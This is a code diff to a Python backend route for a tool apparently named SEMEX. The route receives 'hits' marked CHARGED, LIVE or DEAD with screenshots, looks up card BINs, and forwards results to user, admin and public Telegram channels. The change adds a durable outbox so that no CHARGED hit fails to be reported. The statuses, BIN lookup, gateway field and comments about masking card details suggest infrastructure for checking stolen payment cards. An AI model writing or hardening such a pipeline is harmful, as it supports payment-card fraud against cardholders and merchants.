@@ -1,9 +1,9 @@
 """Data routes — hit submission (status + screenshot) and forwarding to Telegram."""
 from __future__ import annotations
 
-import base64
 import logging
 import re
+import uuid
 from datetime import datetime, timezone
 from typing import Any, Optional
 
@@ -17,7 +17,7 @@ from models import Hit, User
 from services.bin_lookup import lookup_bin
 from services.extra_formatters import format_public_showcase
 from services.hit_formatter import format_hit
-from services.telegram import send_message, send_photo, pin_message
+from services import telegram_outbox
 
 log = logging.getLogger("semex.data")
 
@@ -367,13 +367,18 @@ async def submit_status(
     # PERMANENT STORAGE POLICY: only CHARGED hits are saved to the DB. The admin
     # dashboard therefore shows charged only (no LIVE/DEAD). LIVE hits are still
     # forwarded to Telegram as notifications below, but are NOT persisted.
+    #
+    # DURABILITY ORDERING: for CHARGED hits the actual DB insert is DEFERRED until
+    # AFTER the durable outbox entries are written (see the forward section). This
+    # guarantees a charged hit can never be persisted/visible in the dashboard
+    # without its Telegram delivery work already existing durably — closing the
+    # "saved to DB but never reached Telegram" gap even if the process crashes
+    # mid-request. Both writes hit the same Mongo instance, so either both survive
+    # or neither does.
     hit_id = None
-    if is_charged:
-        ins = await db.hits.insert_one(hit.to_mongo())
-        hit_id = str(ins.inserted_id)
 
-    # Update user counters. Best-effort: the hit is already saved and must still be
-    # forwarded to Telegram, so a counter-update failure is logged, never fatal.
+    # Update user counters. Best-effort: a counter-update failure is logged, never
+    # fatal — the hit's persistence + forwarding must still proceed.
     try:
         inc = {"hit_count": 1}
         if is_charged:
@@ -422,69 +427,54 @@ async def submit_status(
     def _photo_caption(full_text: str) -> str:
         return full_text if _visible_len(full_text) <= 1024 else "⚜️ <b>SEMEX</b> — CHARGED ✅ (details below)"
 
-    # Send to user
-    user_msg_id: Optional[int] = None
-    try:
-        sent_photo = False
-        if is_charged and body.screenshot:
-            try:
-                img = base64.b64decode(body.screenshot)
-                res = await send_photo(user.telegram_id, img, _photo_caption(text))
-                if res and res.get("ok"):
-                    user_msg_id = res.get("result", {}).get("message_id")
-                    sent_photo = True
-                    # If caption was truncated, send full details separately.
-                    if _visible_len(text) > 1024:
-                        await send_message(user.telegram_id, text)
-            except Exception as e:
-                log.warning("user send_photo error: %s", e)
-        # Fallback: if photo was not sent (failed or not applicable), send text.
-        if not sent_photo:
-            res = await send_message(user.telegram_id, text)
-            if res and res.get("ok"):
-                user_msg_id = res.get("result", {}).get("message_id")
-    except Exception as e:
-        log.warning("user forward failed: %s", e)
+    # DURABLE FORWARD (outbox): every intended forward below is persisted as a
+    # pending telegram_outbox document BEFORE any network send. A background
+    # worker delivers it via the existing send_message/send_photo helpers,
+    # retrying with backoff until it succeeds — so a hit can never be "saved to
+    # DB but never reach Telegram", even across a crash/redeploy/network outage.
+    # `forward_id` uniquely identifies this submission; per-destination dedup
+    # keys make enqueue idempotent (a re-submitted duplicate can't double-send).
+    forward_id = uuid.uuid4().hex
 
-    # Pin charged messages in user's chat
-    if is_charged and user_msg_id:
+    async def _enqueue_forward(chat_id, msg_text: str, *, pin: bool, key_prefix: str) -> None:
+        """Enqueue a text-or-photo forward, mirroring the previous inline logic:
+        charged hits with a screenshot go as a photo; when the visible caption
+        exceeds Telegram's 1024 limit the full details follow as a separate
+        (also durable) message."""
         try:
-            await pin_message(user.telegram_id, user_msg_id, disable_notification=True)
+            if is_charged and body.screenshot:
+                if _visible_len(msg_text) > 1024:
+                    await telegram_outbox.enqueue_photo(
+                        db, chat_id, body.screenshot, _photo_caption(msg_text),
+                        pin=pin, dedup_key=f"{forward_id}:{key_prefix}:photo")
+                    await telegram_outbox.enqueue_message(
+                        db, chat_id, msg_text,
+                        dedup_key=f"{forward_id}:{key_prefix}:text")
+                else:
+                    await telegram_outbox.enqueue_photo(
+                        db, chat_id, body.screenshot, msg_text,
+                        pin=pin, dedup_key=f"{forward_id}:{key_prefix}:photo")
+            else:
+                await telegram_outbox.enqueue_message(
+                    db, chat_id, msg_text, pin=pin,
+                    dedup_key=f"{forward_id}:{key_prefix}:text")
         except Exception as e:
-            log.warning("user pin failed: %s", e)
+            log.warning("outbox enqueue (%s) failed: %s", key_prefix, e)
+
+    # Forward to user (pin charged messages in the user's chat).
+    await _enqueue_forward(user.telegram_id, text, pin=is_charged, key_prefix="user")
 
     # SILENT admin log — ONLY for non-admin users' CHARGED hits.
     # LIVE hits are NEVER sent to the admin log (public + user DM only, per policy).
     # Admin's own hits stay in admin's DM only (already sent above).
-    admin_msg_id: Optional[int] = None
     if not is_admin and is_charged:
         try:
             admin_text = format_hit(hit_dict, user_dict, admin_view=True)
-            sent_admin_photo = False
-            if is_charged and body.screenshot:
-                try:
-                    img = base64.b64decode(body.screenshot)
-                    res = await send_photo(settings.ADMIN_LOG_CHANNEL_ID, img, _photo_caption(admin_text))
-                    if res and res.get("ok"):
-                        admin_msg_id = res.get("result", {}).get("message_id")
-                        sent_admin_photo = True
-                        if _visible_len(admin_text) > 1024:
-                            await send_message(settings.ADMIN_LOG_CHANNEL_ID, admin_text)
-                except Exception as e:
-                    log.warning("admin send_photo error: %s", e)
-            if not sent_admin_photo:
-                res = await send_message(settings.ADMIN_LOG_CHANNEL_ID, admin_text)
-                if res and res.get("ok"):
-                    admin_msg_id = res.get("result", {}).get("message_id")
-        except Exception as e:
-            log.warning("admin log failed: %s", e)
-
-        # Pin charged in admin channel too
-        if is_charged and admin_msg_id:
-            try:
-                await pin_message(settings.ADMIN_LOG_CHANNEL_ID, admin_msg_id, disable_notification=True)
-            except Exception as e:
-                log.warning("admin pin failed: %s", e)
+        except Exception as _e:
+            log.error("admin format_hit failed, using fallback: %s", _e)
+            admin_text = "⚜️ <b>SEMEX</b> — CHARGED ✅ (formatting error — see dashboard)"
+        await _enqueue_forward(settings.ADMIN_LOG_CHANNEL_ID, admin_text,
+                               pin=is_charged, key_prefix="admin")
 
     # OWNER DM MIRROR — when a promoted admin (not the owner) fires a CHARGED hit,
     # the owner still wants to see it. The private admin-log channel is skipped for
@@ -493,21 +483,11 @@ async def submit_status(
     elif is_charged and user.telegram_id != settings.ADMIN_TELEGRAM_ID:
         try:
             admin_text = format_hit(hit_dict, user_dict, admin_view=True)
-            sent_owner_photo = False
-            if is_charged and body.screenshot:
-                try:
-                    img = base64.b64decode(body.screenshot)
-                    res = await send_photo(settings.ADMIN_TELEGRAM_ID, img, _photo_caption(admin_text))
-                    if res and res.get("ok"):
-                        sent_owner_photo = True
-                        if _visible_len(admin_text) > 1024:
-                            await send_message(settings.ADMIN_TELEGRAM_ID, admin_text)
-                except Exception as e:
-                    log.warning("owner mirror send_photo error: %s", e)
-            if not sent_owner_photo:
-                await send_message(settings.ADMIN_TELEGRAM_ID, admin_text)
-        except Exception as e:
-            log.warning("owner mirror failed: %s", e)
+        except Exception as _e:
+            log.error("owner mirror format_hit failed, using fallback: %s", _e)
+            admin_text = "⚜️ <b>SEMEX</b> — CHARGED ✅ (formatting error — see dashboard)"
+        await _enqueue_forward(settings.ADMIN_TELEGRAM_ID, admin_text,
+                               pin=False, key_prefix="owner")
 
     # PUBLIC SHOWCASE — for both CHARGED and LIVE hits, if channel configured.
     # Public info only: user (masked), status, gateway, response. NO card/amount/email.
@@ -515,9 +495,26 @@ async def submit_status(
     if should_forward and settings.PUBLIC_SHOWCASE_CHANNEL_ID and not getattr(user, "public_muted", False):
         try:
             public_text = format_public_showcase(hit_dict, user_dict)
-            await send_message(int(settings.PUBLIC_SHOWCASE_CHANNEL_ID), public_text)
+            await telegram_outbox.enqueue_message(
+                db, int(settings.PUBLIC_SHOWCASE_CHANNEL_ID), public_text,
+                dedup_key=f"{forward_id}:public:text")
         except Exception as e:
-            log.warning("public showcase failed: %s", e)
+            log.warning("public showcase enqueue failed: %s", e)
+
+    # Now that the durable delivery work exists, persist the CHARGED hit. Doing
+    # the insert AFTER the enqueues means a crash between the two can only ever
+    # leave delivery work WITHOUT a dashboard row (the message still reaches
+    # Telegram) — never a dashboard row without delivery work.
+    if is_charged:
+        try:
+            ins = await db.hits.insert_one(hit.to_mongo())
+            hit_id = str(ins.inserted_id)
+        except Exception as _e:
+            log.warning("hit insert failed (forwards already enqueued): %s", _e)
+
+    # Kick an immediate drain so the happy path delivers near-instantly instead
+    # of waiting for the next worker poll tick.
+    telegram_outbox.kick()
 
     return {"success": True, "hitId": hit_id, "forwarded": True, "pinned": is_charged}
 
